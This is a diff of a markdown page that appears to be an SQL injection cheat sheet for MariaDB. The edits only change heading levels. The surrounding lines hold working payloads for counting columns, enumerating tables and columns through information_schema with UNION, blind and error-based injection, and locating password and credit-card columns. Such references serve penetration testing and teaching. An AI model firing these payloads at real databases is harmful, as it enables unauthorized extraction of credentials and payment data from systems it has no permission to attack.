@@ -7,15 +7,13 @@ tags: ["schema", "tables", "columns", "enumeration"]
 lastUpdated: 2025-12-18
 ---
 
-## Tables and Columns
-
 Discovering table and column information is a critical step in SQL injection attacks. This information helps map the database structure for targeted data extraction.
 
-### Determining Number of Columns
+## Determining Number of Columns
 
 There are several methods to determine the number of columns in a query:
 
-#### Using ORDER BY or GROUP BY
+### Using ORDER BY or GROUP BY
 
 ```sql
 -- Keep incrementing n until you get an error
@@ -40,7 +38,7 @@ ORDER BY 1, 2
 1' ORDER BY 1, 2--+     -- True
 ```
 
-#### Using GROUP BY with Error-based Method
+### Using GROUP BY with Error-based Method
 
 ```sql
 -- Will show the column number in the error
@@ -55,7 +53,7 @@ ORDER BY 1, 2
 1' ORDER BY 1,2,3,4,5--+  -- Error: "Unknown column '4' in 'order clause'"
 ```
 
-#### Using INTO Variables
+### Using INTO Variables
 
 ```sql
 -- Useful for finding columns after a LIMIT clause
@@ -71,7 +69,7 @@ ORDER BY 1, 2
 -1 UNION SELECT 1 INTO @      -- No error means query uses 1 column
 ```
 
-#### Using Subquery Comparison
+### Using Subquery Comparison
 
 ```sql
 -- Shows number of columns in the table (not query)
@@ -84,7 +82,7 @@ AND (SELECT * FROM SOME_EXISTING_TABLE) = 1
 1 AND (SELECT * FROM Users) = 1  -- Error: "Operand should contain 3 column(s)"
 ```
 
-#### Using UNION SELECT
+### Using UNION SELECT
 
 Test column count by adding/removing values until query succeeds:
 
@@ -101,9 +99,9 @@ SELECT id, username FROM users WHERE id = 999 UNION SELECT 1, 'MARKER_STRING'
 -- Look for 'MARKER_STRING' in output to find which column is displayed
 ```
 
-### Retrieving Tables
+## Retrieving Tables
 
-#### Using UNION
+### Using UNION
 
 ```sql
 -- Filter by current database and table type
@@ -115,7 +113,7 @@ UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table
 
 **Note:** Use `TABLE_TYPE='BASE TABLE'` to filter for user-created tables (excludes views and system tables). Filter by `TABLE_SCHEMA` to exclude system databases.
 
-#### Using Blind Injection
+### Using Blind Injection
 
 ```sql
 -- Basic character comparison (subquery must be wrapped in parentheses)
@@ -150,7 +148,7 @@ SELECT IF(
 ' AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1))=117 -- -
 ```
 
-#### Using Error-based Techniques
+### Using Error-based Techniques
 
 ```sql
 AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))
@@ -167,9 +165,9 @@ AND UpdateXML(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables 
 
 The error message will contain the extracted table name.
 
-### Retrieving Columns
+## Retrieving Columns
 
-#### Using UNION
+### Using UNION
 
 ```sql
 -- Basic column enumeration
@@ -197,7 +195,7 @@ WHERE table_schema = database() AND table_name = 'users'
 ORDER BY ordinal_position
 ```
 
-#### Using Blind Injection
+### Using Blind Injection
 
 ```sql
 -- Basic character comparison (subquery must be wrapped in parentheses)
@@ -225,7 +223,7 @@ SELECT COUNT(*) FROM information_schema.columns
 WHERE table_schema = database() AND table_name = 'users'
 ```
 
-#### Using PROCEDURE ANALYSE() (Legacy)
+### Using PROCEDURE ANALYSE() (Legacy)
 
 _Note: This feature is deprecated and may not be available in newer MariaDB versions._
 
@@ -237,7 +235,7 @@ This technique can automatically extract column information when a query's outpu
 1 LIMIT 1,1 PROCEDURE ANALYSE() -- Second column
 ```
 
-### Find Tables by Column Name
+## Find Tables by Column Name
 
 When looking for specific data like usernames or passwords:
 
@@ -265,7 +263,7 @@ SELECT table_name, column_name FROM information_schema.columns
 WHERE column_name LIKE '%card%' OR column_name LIKE '%credit%' OR column_name LIKE '%payment%';
 ```
 
-### Current Query Inspection
+## Current Query Inspection
 
 You can view the currently executing query:
 
@@ -286,7 +284,7 @@ This can reveal the full query structure including parts you cannot see in the a
 
 **Note:** `performance_schema.processlist` may provide additional details depending on MariaDB configuration.
 
-### Alternative information_schema Views
+## Alternative information_schema Views
 
 When `information_schema.tables` or `information_schema.columns` are blocked:
 
@@ -297,7 +295,7 @@ When `information_schema.tables` or `information_schema.columns` are blocked:
 | `information_schema.key_column_usage`  | Yes                  |
 | `information_schema.table_constraints` | Yes                  |
 
-### Retrieving Multiple Databases at Once
+## Retrieving Multiple Databases at Once
 
 **Simple GROUP_CONCAT method:**
 
